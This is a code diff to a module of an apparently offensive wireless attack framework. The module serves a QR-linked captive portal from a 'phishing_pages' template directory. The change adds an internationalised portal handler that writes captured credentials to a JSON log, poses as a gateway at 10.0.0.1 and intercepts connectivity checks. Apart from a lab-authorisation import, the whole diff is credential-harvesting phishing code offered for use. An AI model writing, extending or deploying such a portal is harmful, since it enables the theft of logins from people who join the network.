@@ -27,6 +27,10 @@ from typing import Optional
 from wirelessxpl.core.exploit import *
 
 from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+from wirelessxpl.modules.generic.wifi_lab._i18n_service import (
+    I18nPortalHandler,
+    SUPPORTED_LOCALES,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -135,13 +139,18 @@ class Exploit(Exploit):
         self._generate_ascii_qr(data)
 
         if self.serve_portal and self.mode in ("portal_qr", "session_qr"):
-            print_info("Serving captive portal on port {}...".format(self.portal_port))
             resources = Path(__file__).resolve().parents[3] / "resources" / "phishing_pages"
             tpl = resources / self.portal_template
             if tpl.is_dir():
-                handler = type("QRHandler", (http.server.SimpleHTTPRequestHandler,),
-                               {"directory": str(tpl)})
-                server = http.server.HTTPServer(("0.0.0.0", self.portal_port), handler)
+                I18nPortalHandler.template_dir = tpl
+                I18nPortalHandler.cred_log = Path(".log") / "qr_portal_creds.json"
+                I18nPortalHandler.portal_host = "10.0.0.1"
+                I18nPortalHandler.connectivity_detect = True
+                I18nPortalHandler.extra_vars = {}
+
+                server = http.server.HTTPServer(("0.0.0.0", self.portal_port), I18nPortalHandler)
+                print_info("Captive portal (i18n) on port {} — locales: {}".format(
+                    self.portal_port, ", ".join(SUPPORTED_LOCALES)))
                 try:
                     server.serve_forever()
                 except KeyboardInterrupt:
